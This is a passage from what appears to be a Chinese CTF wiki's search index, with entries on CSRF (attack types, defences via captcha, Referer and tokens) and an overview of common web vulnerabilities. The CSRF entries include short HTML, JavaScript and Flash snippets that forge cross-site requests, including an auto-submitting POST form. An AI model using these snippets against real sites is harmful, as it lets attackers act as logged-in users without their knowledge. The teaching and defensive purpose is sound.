\uff1a\u4f20\u7edf\u7684\u6570\u5b57\u8d44\u4ea7\u5e76\u6ca1\u6709\u7edf\u4e00\u7684\u8868\u8fbe\u65b9\u5f0f\uff0c\u800c\u901a\u8fc7\u5728\u516c\u94fe\u4e0a\u663e\u793a\u975e\u540c\u8d28\u5316\u8d44\u4ea7\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u6784\u5efa\u901a\u7528\u3001\u53ef\u91cd\u7528\u3001\u53ef\u7ee7\u627f\u7684\u6240\u6709\u975e\u540c\u8d28\u5316\u4ee3\u5e01\u6807\u51c6\u3002\u8fd9\u5305\u62ec\u57fa\u672c\u7684\u539f\u8bed\uff0c\u5982\u6240\u6709\u6743\u3001\u4f20\u8f93\u548c\u7b80\u5355\u7684\u8bbf\u95ee\u63a7\u5236\u3002 \uff089\uff09\u6d41\u52a8\u6027 \uff1a\u975e\u540c\u8d28\u5316\u8d44\u4ea7\u7684\u6781\u901f\u53ef\u4ea4\u6613\u6027\u4f1a\u5e26\u6765\u6d41\u52a8\u6027\u7684\u63d0\u5347\u3002NFT \u5e02\u573a\u53ef\u4ee5\u6ee1\u8db3\u5404\u79cd\u53d7\u4f17\u7684\u9700\u6c42\uff0c\u4ece\u4e25\u683c\u7684\u4ea4\u6613\u8005\u5230\u8f83\u4e0d\u6210\u719f\u7684\u4ea4\u6613\u8005\uff0c\u90fd\u53ef\u4ee5\u8ba9\u8d44\u4ea7\u66f4\u5e7f\u6cdb\u5730\u9762\u5411\u66f4\u591a\u7684\u8d2d\u4e70\u8005\u3002\u4e0e 2017 \u5e74\u7684 ICO \u70ed\u6f6e\u50ac\u751f\u51fa\u7531\u5373\u65f6\u6d41\u52a8\u8d27\u5e01\u9a71\u52a8\u7684\u65b0\u4e00\u7c7b\u8d44\u4ea7\u4e00\u6837\uff0c NFT \u62d3\u5c55\u4e86\u6570\u5b57\u8d44\u4ea7\u8fd9\u4e00\u72ec\u7279\u7684\u5e02\u573a\u3002 \uff0810\uff09\u4e92\u64cd\u4f5c\u6027 \uff1a\u975e\u540c\u8d28\u5316\u4ee3\u5e01\u6807\u51c6\u5141\u8bb8 NFT \u5728\u591a\u4e2a\u751f\u6001\u7cfb\u7edf\u4e4b\u95f4\u8f7b\u677e\u79fb\u52a8\u3002\u5f53\u5f00\u53d1\u4eba\u5458\u542f\u52a8\u65b0\u7684 NFT \u9879\u76ee\u65f6\uff0c\u8fd9\u4e9b NFT \u53ef\u4ee5\u7acb\u5373\u5728\u6570\u5341\u4e2a\u4e0d\u540c\u7684\u94b1\u5305\u63d0\u4f9b\u7a0b\u5e8f\u4e2d\u67e5\u770b\uff0c\u53ef\u4ee5\u5728\u5e02\u573a\u4e0a\u8fdb\u884c\u4ea4\u6613\uff0c\u5e76\u4e14\u53ef\u4ee5\u5728\u865a\u62df\u4e16\u754c\u4e2d\u663e\u793a\uff0c\u56e0\u4e3a\u5f00\u653e\u6807\u51c6\u4e3a\u8bfb\u53d6\u548c\u5199\u5165\u6570\u636e\u63d0\u4f9b\u4e86\u6e05\u6670\u3001\u4e00\u81f4\u3001\u53ef\u9760\u548c\u8bb8\u53ef\u7684 API\u3002","title":"NFT\u7684\u4e3b\u8981\u7279\u70b9"},{"location":"nft/introduction/#_1","text":"","title":""},{"location":"web/csrf/","text":"CSRF \u00b6 CSRF \u7b80\u4ecb \u00b6 CSRF\uff0c\u5168\u540d Cross Site Request Forgery\uff0c\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3002\u5f88\u5bb9\u6613\u5c06\u5b83\u4e0e XSS \u6df7\u6dc6\uff0c\u5bf9\u4e8e CSRF\uff0c\u5176\u4e24\u4e2a\u5173\u952e\u70b9\u662f\u8de8\u7ad9\u70b9\u7684\u8bf7\u6c42\u4e0e\u8bf7\u6c42\u7684\u4f2a\u9020\uff0c\u7531\u4e8e\u76ee\u6807\u7ad9\u65e0 token \u6216 referer \u9632\u5fa1\uff0c\u5bfc\u81f4\u7528\u6237\u7684\u654f\u611f\u64cd\u4f5c\u7684\u6bcf\u4e00\u4e2a\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u83b7\u77e5\uff0c\u653b\u51fb\u8005\u5373\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a\u5b8c\u5168\u4e00\u6837\u7684\u8bf7\u6c42\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u8fbe\u5230\u6076\u610f\u76ee\u7684\u3002 CSRF \u7c7b\u578b \u00b6 \u6309\u8bf7\u6c42\u7c7b\u578b\uff0c\u53ef\u5206\u4e3a GET \u578b\u548c POST \u578b\u3002 \u6309\u653b\u51fb\u65b9\u5f0f\uff0c\u53ef\u5206\u4e3a HTML CSRF\u3001JSON HiJacking\u3001Flash CSRF \u7b49\u3002 HTML CSRF \u00b6 \u5229\u7528 HTML \u5143\u7d20\u53d1\u51fa CSRF \u8bf7\u6c42\uff0c\u8fd9\u662f\u6700\u5e38\u89c1\u7684 CSRF \u653b\u51fb\u3002 HTML \u4e2d\u80fd\u8bbe\u7f6e src/href \u7b49\u94fe\u63a5\u5730\u5740\u7684\u6807\u7b7e\u90fd\u53ef\u4ee5\u53d1\u8d77\u4e00\u4e2a GET \u8bf7\u6c42\uff0c\u5982\uff1a < link href = \"\" > < img src = \"\" > < img lowsrc = \"\" > < img dynsrc = \"\" > < meta http-equiv = \"refresh\" content = \"0; url=\" > < iframe src = \"\" > < frame src = \"\" > < script src = \"\" ></ script > < bgsound src = \"\" ></ bgsound > < embed src = \"\" ></ bgsound > < video src = \"\" ></ video > < audio src = \"\" ></ audio > < a href = \"\" ></ a > < table background = \"\" ></ table > ...... \u8fd8\u6709 CSS \u6837\u5f0f\u4e2d\u7684\uff1a @ import \"\" background : url ( \"\" ) ...... \u4e5f\u53ef\u4f7f\u7528\u8868\u5355\u6765\u5bf9 POST \u578b\u7684\u8bf7\u6c42\u8fdb\u884c\u4f2a\u9020\u3002 < form action = \"http://www.a.com/register\" id = \"register\" method = \"post\" > < input type = text name = \"username\" value = \"\" /> < input type = password name = \"password\" value = \"\" /> </ form > < script > var f = document . getElementById ( \"register\" ); f . inputs [ 0 ]. value = \"test\" ; f . inputs [ 1 ]. value = \"passwd\" ; f . submit (); </ script > Flash CSRF \u00b6 Flash \u4e5f\u6709\u5404\u79cd\u65b9\u5f0f\u53ef\u4ee5\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\uff0c\u5305\u62ec POST\u3002 import flash . net . URLRequest ; import flash . system . Security ; var url = new URLRequest ( \"http://target/page\" ); var param = new URLVariables (); param = \"test=123\" ; url . method = \"POST\" ; url . data = param ; sendToURL ( url ); stop (); Flash \u4e2d\u8fd8\u53ef\u4ee5\u4f7f\u7528 getURL \u3001 loadVars \u7b49\u65b9\u5f0f\u53d1\u8d77\u8bf7\u6c42\u3002 req = new LoadVars (); req . addRequestHeader ( \"foo\" , \"bar\" ); req . send ( \"http://target/page?v1=123&v2=222\" , \"_blank\" , \"GET\" ); CSRF \u7684\u9632\u5fa1 \u00b6 \u9a8c\u8bc1\u7801 \u00b6 \u9a8c\u8bc1\u7801\u5f3a\u5236\u7528\u6237\u5fc5\u987b\u4e0e\u5e94\u7528\u8fdb\u884c\u4ea4\u4e92\uff0c\u624d\u80fd\u5b8c\u6210\u6700\u7ec8\u8bf7\u6c42\u3002 Referer Check \u00b6 \u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u5408\u6cd5\u7684\u6e90\u3002\u4f46\u670d\u52a1\u5668\u5e76\u975e\u4ec0\u4e48\u65f6\u5019\u90fd\u80fd\u53d6\u5f97 Referer\u3002 Token \u00b6 CSRF \u80fd\u591f\u653b\u51fb\u6210\u529f\u7684\u672c\u8d28\u539f\u56e0\u662f\u91cd\u8981\u64cd\u4f5c\u7684\u6240\u6709\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u731c\u6d4b\u5f97\u5230\u3002 \u4fdd\u6301\u539f\u53c2\u6570\u4e0d\u53d8\uff0c\u65b0\u589e\u4e00\u4e2a\u53c2\u6570 Token\uff0c\u503c\u662f\u968f\u673a\u7684\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0cToken \u53ef\u4ee5\u653e\u5728\u7528\u6237\u7684 Session \u4e2d\uff0c\u6216\u6d4f\u89c8\u5668\u7684 Cookies \u4e2d\u3002 Token \u4e00\u5b9a\u8981\u8db3\u591f\u968f\u673a\u3002\u6b64\u5916\uff0cToken \u7684\u76ee\u7684\u4e0d\u662f\u4e3a\u4e86\u9632\u6b62\u91cd\u590d\u63d0\u4ea4\uff0c\u6240\u4ee5\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u53ef\u4ee5\u5141\u8bb8\u5728\u4e00\u4e2a\u7528\u6237\u7684\u6709\u6548\u751f\u547d\u5468\u671f\u5185\uff0c\u5728 Token \u6d88\u8017\u6389\u4e4b\u524d\u90fd\u4f7f\u7528\u540c\u4e00\u4e2a Token\uff0c\u4f46\u5982\u679c\u7528\u6237\u5df2\u7ecf\u63d0\u4ea4\u4e86\u8868\u5355\uff0c\u5219\u8fd9\u4e2a Token \u5df2\u7ecf\u6d88\u8017\u6389\uff0c\u5e94\u8be5\u91cd\u65b0\u751f\u6210 Token\u3002 Token \u8fd8\u5e94\u6ce8\u610f\u5176\u4fdd\u5bc6\u6027\uff0c\u5982\u679c Token \u51fa\u73b0\u5728 URL \u4e2d\uff0c\u5219\u53ef\u80fd\u4f1a\u901a\u8fc7 Referer \u6cc4\u9732\uff0c\u5e94\u5c3d\u91cf\u628a Token \u653e\u5728\u8868\u5355\u4e2d\uff0c\u628a\u654f\u611f\u64cd\u4f5c\u7531 GET \u6539\u4e3a POST\uff0c\u4ee5\u8868\u5355\u6216 AJAX \u7684\u5f62\u5f0f\u63d0\u4ea4\uff0c\u907f\u514d Token \u6cc4\u9732\u3002","title":"CSRF"},{"location":"web/csrf/#csrf","text":"","title":"CSRF"},{"location":"web/csrf/#csrf_1","text":"CSRF\uff0c\u5168\u540d Cross Site Request Forgery\uff0c\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3002\u5f88\u5bb9\u6613\u5c06\u5b83\u4e0e XSS \u6df7\u6dc6\uff0c\u5bf9\u4e8e CSRF\uff0c\u5176\u4e24\u4e2a\u5173\u952e\u70b9\u662f\u8de8\u7ad9\u70b9\u7684\u8bf7\u6c42\u4e0e\u8bf7\u6c42\u7684\u4f2a\u9020\uff0c\u7531\u4e8e\u76ee\u6807\u7ad9\u65e0 token \u6216 referer \u9632\u5fa1\uff0c\u5bfc\u81f4\u7528\u6237\u7684\u654f\u611f\u64cd\u4f5c\u7684\u6bcf\u4e00\u4e2a\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u83b7\u77e5\uff0c\u653b\u51fb\u8005\u5373\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a\u5b8c\u5168\u4e00\u6837\u7684\u8bf7\u6c42\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u8fbe\u5230\u6076\u610f\u76ee\u7684\u3002","title":"CSRF \u7b80\u4ecb"},{"location":"web/csrf/#csrf_2","text":"\u6309\u8bf7\u6c42\u7c7b\u578b\uff0c\u53ef\u5206\u4e3a GET \u578b\u548c POST \u578b\u3002 \u6309\u653b\u51fb\u65b9\u5f0f\uff0c\u53ef\u5206\u4e3a HTML CSRF\u3001JSON HiJacking\u3001Flash CSRF \u7b49\u3002","title":"CSRF \u7c7b\u578b"},{"location":"web/csrf/#html-csrf","text":"\u5229\u7528 HTML \u5143\u7d20\u53d1\u51fa CSRF \u8bf7\u6c42\uff0c\u8fd9\u662f\u6700\u5e38\u89c1\u7684 CSRF \u653b\u51fb\u3002 HTML \u4e2d\u80fd\u8bbe\u7f6e src/href \u7b49\u94fe\u63a5\u5730\u5740\u7684\u6807\u7b7e\u90fd\u53ef\u4ee5\u53d1\u8d77\u4e00\u4e2a GET \u8bf7\u6c42\uff0c\u5982\uff1a < link href = \"\" > < img src = \"\" > < img lowsrc = \"\" > < img dynsrc = \"\" > < meta http-equiv = \"refresh\" content = \"0; url=\" > < iframe src = \"\" > < frame src = \"\" > < script src = \"\" ></ script > < bgsound src = \"\" ></ bgsound > < embed src = \"\" ></ bgsound > < video src = \"\" ></ video > < audio src = \"\" ></ audio > < a href = \"\" ></ a > < table background = \"\" ></ table > ...... \u8fd8\u6709 CSS \u6837\u5f0f\u4e2d\u7684\uff1a @ import \"\" background : url ( \"\" ) ...... \u4e5f\u53ef\u4f7f\u7528\u8868\u5355\u6765\u5bf9 POST \u578b\u7684\u8bf7\u6c42\u8fdb\u884c\u4f2a\u9020\u3002 < form action = \"http://www.a.com/register\" id = \"register\" method = \"post\" > < input type = text name = \"username\" value = \"\" /> < input type = password name = \"password\" value = \"\" /> </ form > < script > var f = document . getElementById ( \"register\" ); f . inputs [ 0 ]. value = \"test\" ; f . inputs [ 1 ]. value = \"passwd\" ; f . submit (); </ script >","title":"HTML CSRF"},{"location":"web/csrf/#flash-csrf","text":"Flash \u4e5f\u6709\u5404\u79cd\u65b9\u5f0f\u53ef\u4ee5\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\uff0c\u5305\u62ec POST\u3002 import flash . net . URLRequest ; import flash . system . Security ; var url = new URLRequest ( \"http://target/page\" ); var param = new URLVariables (); param = \"test=123\" ; url . method = \"POST\" ; url . data = param ; sendToURL ( url ); stop (); Flash \u4e2d\u8fd8\u53ef\u4ee5\u4f7f\u7528 getURL \u3001 loadVars \u7b49\u65b9\u5f0f\u53d1\u8d77\u8bf7\u6c42\u3002 req = new LoadVars (); req . addRequestHeader ( \"foo\" , \"bar\" ); req . send ( \"http://target/page?v1=123&v2=222\" , \"_blank\" , \"GET\" );","title":"Flash CSRF"},{"location":"web/csrf/#csrf_3","text":"","title":"CSRF \u7684\u9632\u5fa1"},{"location":"web/csrf/#_1","text":"\u9a8c\u8bc1\u7801\u5f3a\u5236\u7528\u6237\u5fc5\u987b\u4e0e\u5e94\u7528\u8fdb\u884c\u4ea4\u4e92\uff0c\u624d\u80fd\u5b8c\u6210\u6700\u7ec8\u8bf7\u6c42\u3002","title":"\u9a8c\u8bc1\u7801"},{"location":"web/csrf/#referer-check","text":"\u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u5408\u6cd5\u7684\u6e90\u3002\u4f46\u670d\u52a1\u5668\u5e76\u975e\u4ec0\u4e48\u65f6\u5019\u90fd\u80fd\u53d6\u5f97 Referer\u3002","title":"Referer Check"},{"location":"web/csrf/#token","text":"CSRF \u80fd\u591f\u653b\u51fb\u6210\u529f\u7684\u672c\u8d28\u539f\u56e0\u662f\u91cd\u8981\u64cd\u4f5c\u7684\u6240\u6709\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u731c\u6d4b\u5f97\u5230\u3002 \u4fdd\u6301\u539f\u53c2\u6570\u4e0d\u53d8\uff0c\u65b0\u589e\u4e00\u4e2a\u53c2\u6570 Token\uff0c\u503c\u662f\u968f\u673a\u7684\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0cToken \u53ef\u4ee5\u653e\u5728\u7528\u6237\u7684 Session \u4e2d\uff0c\u6216\u6d4f\u89c8\u5668\u7684 Cookies \u4e2d\u3002 Token \u4e00\u5b9a\u8981\u8db3\u591f\u968f\u673a\u3002\u6b64\u5916\uff0cToken \u7684\u76ee\u7684\u4e0d\u662f\u4e3a\u4e86\u9632\u6b62\u91cd\u590d\u63d0\u4ea4\uff0c\u6240\u4ee5\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u53ef\u4ee5\u5141\u8bb8\u5728\u4e00\u4e2a\u7528\u6237\u7684\u6709\u6548\u751f\u547d\u5468\u671f\u5185\uff0c\u5728 Token \u6d88\u8017\u6389\u4e4b\u524d\u90fd\u4f7f\u7528\u540c\u4e00\u4e2a Token\uff0c\u4f46\u5982\u679c\u7528\u6237\u5df2\u7ecf\u63d0\u4ea4\u4e86\u8868\u5355\uff0c\u5219\u8fd9\u4e2a Token \u5df2\u7ecf\u6d88\u8017\u6389\uff0c\u5e94\u8be5\u91cd\u65b0\u751f\u6210 Token\u3002 Token \u8fd8\u5e94\u6ce8\u610f\u5176\u4fdd\u5bc6\u6027\uff0c\u5982\u679c Token \u51fa\u73b0\u5728 URL \u4e2d\uff0c\u5219\u53ef\u80fd\u4f1a\u901a\u8fc7 Referer \u6cc4\u9732\uff0c\u5e94\u5c3d\u91cf\u628a Token \u653e\u5728\u8868\u5355\u4e2d\uff0c\u628a\u654f\u611f\u64cd\u4f5c\u7531 GET \u6539\u4e3a POST\uff0c\u4ee5\u8868\u5355\u6216 AJAX \u7684\u5f62\u5f0f\u63d0\u4ea4\uff0c\u907f\u514d Token \u6cc4\u9732\u3002","title":"Token"},{"location":"web/introduction/","text":"Web \u7b80\u4ecb \u00b6 \u968f\u7740 WEB 2.0\u3001\u793e\u4ea4\u7f51\u7edc\u3001\u5fae\u535a\u7b49\u7b49\u4e00\u7cfb\u5217\u65b0\u578b\u7684\u4e92\u8054\u7f51\u4ea7\u54c1\u7684\u8bde\u751f\uff0c\u57fa\u4e8e WEB \u73af\u5883\u7684\u4e92\u8054\u7f51\u5e94\u7528\u8d8a\u6765\u8d8a\u5e7f\u6cdb\uff0c\u4f01\u4e1a\u4fe1\u606f\u5316\u7684\u8fc7\u7a0b\u4e2d\u5404\u79cd\u5e94\u7528\u90fd\u67b6\u8bbe\u5728 WEB \u5e73\u53f0\u4e0a\uff0cWEB \u4e1a\u52a1\u7684\u8fc5\u901f\u53d1\u5c55\u4e5f\u5f15\u8d77\u9ed1\u5ba2\u4eec\u7684\u5f3a\u70c8\u5173\u6ce8\uff0c\u63a5\u8e35\u800c\u81f3\u7684\u5c31\u662f WEB \u5b89\u5168\u5a01\u80c1\u7684\u51f8\u663e\uff0c\u9ed1\u5ba2\u5229\u7528\u7f51\u7ad9\u64cd\u4f5c\u7cfb\u7edf\u7684\u6f0f\u6d1e\u548c WEB \u670d\u52a1\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f97\u5230 WEB \u670d\u52a1\u5668\u7684\u63a7\u5236\u6743\u9650\uff0c\u8f7b\u5219\u7be1\u6539\u7f51\u9875\u5185\u5bb9\uff0c\u91cd\u5219\u7a83\u53d6\u91cd\u8981\u5185\u90e8\u6570\u636e\uff0c\u66f4\u4e3a\u4e25\u91cd\u7684\u5219\u662f\u5728\u7f51\u9875\u4e2d\u690d\u5165\u6076\u610f\u4ee3\u7801\uff0c\u4f7f\u5f97\u7f51\u7ad9\u8bbf\u95ee\u8005\u53d7\u5230\u4fb5\u5bb3\u3002 \u5728 CTF \u7ade\u8d5b\u4e2d\uff0cWEB \u4e5f\u662f\u5360\u6bd4\u91cd\u5f88\u5927\u7684\u4e00\u4e2a\u65b9\u5411\u4e4b\u4e00\uff0cWEB \u7c7b\u7684\u9898\u76ee\u79cd\u7c7b\u7e41\u591a\uff0c\u77e5\u8bc6\u70b9\u7ec6\u788e\uff0c\u65f6\u6548\u6027\u5f3a\uff0c\u80fd\u7d27\u8ddf\u65f6\u4e0b\u70ed\u70b9\u6f0f\u6d1e\uff0c\u8d34\u8fd1\u5b9e\u6218\u3002 WEB \u7c7b\u7684\u9898\u76ee\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1aSQL \u6ce8\u5165\u3001XSS \u8de8\u7ad9\u811a\u672c\u3001CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u6587\u4ef6\u5305\u542b\u3001\u6846\u67b6\u5b89\u5168\u3001PHP \u5e38\u89c1\u6f0f\u6d1e\u3001\u4ee3\u7801\u5ba1\u8ba1\u7b49\u3002 SQL \u6ce8\u5165 \u00b6 \u901a\u8fc7\u5728\u7528\u6237\u53ef\u63a7\u53c2\u6570\u4e2d\u6ce8\u5165 SQL \u8bed\u6cd5\uff0c\u7834\u574f\u539f\u6709 SQL \u7ed3\u6784\uff0c\u8fbe\u5230\u7f16\u5199\u7a0b\u5e8f\u65f6\u610f\u6599\u4e4b\u5916\u7ed3\u679c\u7684\u653b\u51fb\u884c\u4e3a\u3002\u5176\u6210\u56e0\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u4ee5\u4e0b\u4e24\u4e2a\u539f\u56e0\u53e0\u52a0\u9020\u6210\u7684\uff1a \u7a0b\u5e8f\u7f16\u5199\u8005\u5728\u5904\u7406\u5e94\u7528\u7a0b\u5e8f\u548c\u6570\u636e\u5e93\u4ea4\u4e92\u65f6\uff0c\u4f7f\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u65b9\u5f0f\u6784\u9020 SQL \u8bed\u53e5 \u672a\u5bf9\u7528\u6237\u53ef\u63a7\u53c2\u6570\u8fdb\u884c\u8db3\u591f\u7684\u8fc7\u6ee4\u4fbf\u5c06\u53c2\u6570\u5185\u5bb9\u62fc\u63a5\u8fdb\u5165\u5230 SQL \u8bed\u53e5\u4e2d XSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb \u00b6 \u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08Cross Site Scripting\uff09\uff0c\u4e3a\u4e0d\u548c\u5c42\u53e0\u6837\u5f0f\u8868\uff08Cascading Style Sheets\uff0cCSS\uff09\u7684\u7f29\u5199\u6df7\u6dc6\uff0c\u6545\u5c06\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u7f29\u5199\u4e3a XSS\u3002\u6076\u610f\u653b\u51fb\u8005\u5f80 WEB \u9875\u9762\u91cc\u63d2\u5165\u6076\u610f HTML \u4ee3\u7801\uff0c\u5f53\u7528\u6237\u6d4f\u89c8\u8be5\u9875\u4e4b\u65f6\uff0c\u5d4c\u5165\u5176\u4e2d Web \u91cc\u9762\u7684 HTML \u4ee3\u7801\u4f1a\u88ab\u6267\u884c\uff0c\u4ece\u800c\u8fbe\u5230\u6076\u610f\u653b\u51fb\u7528\u6237\u7684\u7279\u6b8a\u76ee\u7684\u3002 \u547d\u4ee4\u6267\u884c \u00b6 \u5f53\u5e94\u7528\u9700\u8981\u8c03\u7528\u4e00\u4e9b\u5916\u90e8\u7a0b\u5e8f\u53bb\u5904\u7406\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u5c31\u4f1a\u7528\u5230\u4e00\u4e9b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u51fd\u6570\u3002\u5982 PHP \u4e2d\u7684 system \u3001 exec \u3001 shell_exec \u7b49\uff0c\u5f53\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u547d\u4ee4\u6267\u884c\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u65f6\uff0c\u5c06\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u7cfb\u7edf\u547d\u4ee4\u5230\u6b63\u5e38\u547d\u4ee4\u4e2d\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c\u653b\u51fb\u3002\u8fd9\u91cc\u8fd8\u662f\u4e3b\u8981\u4ee5 PHP \u4e3a\u4e3b\u4ecb\u7ecd\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0cJava \u7b49\u5e94\u7528\u7684\u7ec6\u8282\u5f85\u8865\u5145\u3002 \u6587\u4ef6\u5305\u542b \u00b6 \u5982\u679c\u5141\u8bb8\u5ba2\u6237\u7aef\u7528\u6237\u8f93\u5165\u63a7\u5236\u52a8\u6001\u5305\u542b\u5728\u670d\u52a1\u5668\u7aef\u7684\u6587\u4ef6\uff0c\u4f1a\u5bfc\u81f4\u6076\u610f\u4ee3\u7801\u7684\u6267\u884c\u53ca\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff0c\u4e3b\u8981\u5305\u62ec\u672c\u5730\u6587\u4ef6\u5305\u542b\u548c\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u4e24\u79cd\u5f62\u5f0f\u3002 CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 \u00b6 \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08Cross-Site Request Forgery\uff0cCSRF\uff09\u662f\u4e00\u79cd\u4f7f\u5df2\u767b\u5f55\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u67d0\u79cd\u52a8\u4f5c\u7684\u653b\u51fb\u3002\u56e0\u4e3a\u653b\u51fb\u8005\u770b\u4e0d\u5230\u4f2a\u9020\u8bf7\u6c42\u7684\u54cd\u5e94\u7ed3\u679c\uff0c\u6240\u4ee5 CSRF \u653b\u51fb\u4e3b\u8981\u7528\u6765\u6267\u884c\u52a8\u4f5c\uff0c\u800c\u975e\u7a83\u53d6\u7528\u6237\u6570\u636e\u3002\u5f53\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u666e\u901a\u7528\u6237\u65f6\uff0cCSRF \u53ef\u4ee5\u5b9e\u73b0\u5728\u5176\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u8f6c\u79fb\u7528\u6237\u8d44\u91d1\u3001\u53d1\u9001\u90ae\u4ef6\u7b49\u64cd\u4f5c\uff1b\u4f46\u662f\u5982\u679c\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\u7684\u7528\u6237\u65f6 CSRF \u5219\u53ef\u80fd\u5a01\u80c1\u5230\u6574\u4e2a WEB \u7cfb\u7edf\u7684\u5b89\u5168\u3002 SSRF \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020 \u00b6 SSRF\uff08Server-Side Request Forgery\uff1a\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff09\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002 \u6587\u4ef6\u4e0a\u4f20 \u00b6 \u5728\u7f51\u7ad9\u7684\u8fd0\u8425\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u907f\u514d\u5730\u8981\u5bf9\u7f51\u7ad9\u7684\u67d0\u4e9b\u9875\u9762\u6216\u8005\u5185\u5bb9\u8fdb\u884c\u66f4\u65b0\uff0c\u8fd9\u65f6\u4fbf\u9700\u8981\u4f7f\u7528\u5230\u7f51\u7ad9\u7684\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\u3002\u5982\u679c\u4e0d\u5bf9\u88ab\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u9650\u5236\u6216\u8005\u9650\u5236\u88ab\u7ed5\u8fc7\uff0c\u8be5\u529f\u80fd\u4fbf\u6709\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u4e8e\u4e0a\u4f20\u53ef\u6267\u884c\u6587\u4ef6\u3001\u811a\u672c\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u8fdb\u800c\u8fdb\u4e00\u6b65\u5bfc\u81f4\u670d\u52a1\u5668\u6ca6\u9677\u3002 \u70b9\u51fb\u52ab\u6301 \u00b6 Clickjacking\uff08\u70b9\u51fb\u52ab\u6301\uff09\u662f\u7531\u4e92\u8054\u7f51\u5b89\u5168\u4e13\u5bb6\u7f57\u4f2f\u7279\u00b7\u6c49\u68ee\u548c\u8036\u5229\u7c73\u00b7\u683c\u52b3\u65af\u66fc\u5728 2008 \u5e74\u9996\u521b\u7684\u3002 \u662f\u4e00\u79cd\u89c6\u89c9\u6b3a\u9a97\u624b\u6bb5\uff0c\u5728 WEB \u7aef\u5c31\u662f iframe \u5d4c\u5957\u4e00\u4e2a\u900f\u660e\u4e0d\u53ef\u89c1\u7684\u9875\u9762\uff0c\u8ba9\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u70b9\u51fb\u653b\u51fb\u8005\u60f3\u8981\u6b3a\u9a97\u7528\u6237\u70b9\u51fb\u7684\u4f4d\u7f6e\u3002 \u7531\u4e8e\u70b9\u51fb\u52ab\u6301\u7684\u51fa\u73b0\uff0c\u4fbf\u51fa\u73b0\u4e86\u53cd frame \u5d4c\u5957\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u70b9\u51fb\u52ab\u6301\u9700\u8981 iframe \u5d4c\u5957\u9875\u9762\u6765\u653b\u51fb\u3002 \u4e0b\u9762\u4ee3\u7801\u662f\u6700\u5e38\u89c1\u7684\u9632\u6b62 frame \u5d4c\u5957\u7684\u4f8b\u5b50\uff1a if ( top . location != location ) top . location = self . location ; VPS \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668 \u00b6 VPS\uff08Virtual Private Server \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff09\u6280\u672f\uff0c\u5c06\u4e00\u90e8\u670d\u52a1\u5668\u5206\u5272\u6210\u591a\u4e2a\u865a\u62df\u4e13\u4eab\u670d\u52a1\u5668\u7684\u4f18\u8d28\u670d\u52a1\u3002\u5b9e\u73b0 VPS 